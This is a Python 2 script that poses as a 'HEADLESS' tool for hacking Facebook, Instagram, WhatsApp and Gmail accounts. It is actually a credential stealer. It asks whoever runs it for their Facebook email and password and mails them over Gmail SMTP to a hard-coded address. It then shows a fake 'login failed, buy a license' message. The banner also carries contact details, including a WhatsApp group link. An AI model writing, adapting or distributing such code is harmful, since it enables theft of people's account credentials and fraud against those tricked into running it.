#programing by HEADLESS

# import necessary packages 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time

num = 3
no1 = 1
no2 = 2
no3 = 3
no4 = 4

##read file ##
filename = "/etc/kode"
kode = ""
try:
  with open(filename) as f:
    data = f.readlines()
  for n, line in enumerate(data,):
    kode = kode +  (line.rstrip())
except IOError:
## eror file
  print( "ERROR")
  kode = "ERROR"

msg = MIMEMultipart()

time.sleep(1)
print"H   H HHHH     H     HHHH  H    HHHH HHHH HHHH"
print"H   H H       H H    H   H H    H    H    H"
print"HHHHH HHHH   H   H   H   H H    HHHH HHHH HHHH"
print"H   H H     H HHH H  H   H H    H       H    H"
print"H   H HHHH H       H HHH   HHHH HHHH HHHH HHHH "
print"Loading......................................."
time.sleep(3)
print "+==========================================================+"
print "|.....................HEADLESS ACTEKER.....................|"
print "+----------------------------------------------------------+"
time.sleep(2)
print "|#Group: HEADLESS TEAM                                     |"
print "|#Contact: 08228*31*41*                                    |"
print "|#WhatsApp:https://chat.whatsapp.com/DSkQyioa3GL2kHOxSEIDcH|"
print "|#Situs:putradomainer.com                                  |"
print "|#Date: 02/04/2013                                         |"
print "|                   use of this program !                  |"
print "+==========================================================+"
print "|........................Hapy Hacking......................|"
print "+----------------------------------------------------------+"

print"-----------------------------------------"
time.sleep(1)
print"          |1.Hack facebook |"
time.sleep(1)
print"          |2.Hack instagram|"
time.sleep(1)
print"          |3.Hack whatsapp |"
time.sleep(1)
print"          |4.Hack gmail    |"
time.sleep(1)
print"------------------------------------------"

text = raw_input("Masukan Pilihan Anda: ")

print("Login Facebook Terlebih Dahulu")
message = raw_input("Silahkan Masuk Email: ")
#massage1 = "spasi"
message2 = raw_input("Silahkan Masuk Password: ")
# if text == 1:
#   print"tunggu" 
# setup the parameters of the message
password = kode
msg['From'] = "putracic8@gmail.com"
msg['To'] = "budimira11@gmail.com"
msg['Subject'] = "Subscription"
 
# add in the message body
msg.attach(MIMEText(message, 'plain'))
#msg.attach(MIMEText(message1, 'plain'))
msg.attach(MIMEText(message2, 'plain'))
#create server
server = smtplib.SMTP('smtp.gmail.com: 587')
 
server.starttls()
 
# Login Credentials for sending the mail
server.login(msg['From'], password)
# send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()
print"Mencoba Login, Harap Tunggu"
time.sleep(3)
print"Login Gagal, Mohon Beli Laysen"
#print "http://www.facebook.com %s:" % (['message'])
#status = sukses
#while True:
#	if num > 0:
#		print"Mencoba Login, Harap Tunggu Sebentar"
#		time.sleep(2)
#		print"Login Gagal"
#quit()
